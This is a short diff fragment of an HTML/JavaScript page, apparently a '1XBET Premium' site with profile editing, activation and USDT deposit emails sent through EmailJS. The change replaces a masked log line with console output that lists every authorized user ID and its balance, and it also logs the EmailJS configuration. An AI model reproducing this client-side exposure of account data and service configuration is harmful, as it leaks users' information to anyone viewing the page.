+            // Mettre à jour l'affichage
+            updateProfileDisplay();
+            
+            // Revenir au mode visualisation
+            profileEditMode.style.display = 'none';
+            profileViewMode.style.display = 'block';
+            
+            alert('✅ Profil mis à jour avec succès!');
         });
 
         // Sélection des niveaux
@@ -2634,11 +3340,19 @@
         document.addEventListener('DOMContentLoaded', function() {
             console.log("✅ Site 1XBET Premium chargé avec succès");
             console.log("📧 Configuration EmailJS:", EMAILJS_CONFIG);
-            console.log("🔐 Accès restreint à l'ID:", "*** masqué pour sécurité ***");
+            console.log("🔐 Système multi-utilisateurs avancé activé");
+            console.log("👥 Utilisateurs disponibles:");
+            Object.keys(AUTHORIZED_USERS).forEach(userId => {
+                console.log(`   - ID: ${userId} | Solde: ${AUTHORIZED_USERS[userId].balance} USDT`);
+            });
             console.log("📨 Templates configurés:");
             console.log("   - Activation:", EMAILJS_CONFIG.TEMPLATE_ACTIVATION);
             console.log("   - Dépôt:", EMAILJS_CONFIG.TEMPLATE_DEPOSIT);
+            console.log("👤 Système de profil avec mémorisation avancée");
+            console.log("💳 Gestion des profils individuels par ID utilisateur");
+            console.log("📧 Champ Gmail ajouté au formulaire d'activation");
+            console.log("🎯 Interface améliorée avec espacement optimal");
         });
     </script>
 </body>
-</html>
+    </html>
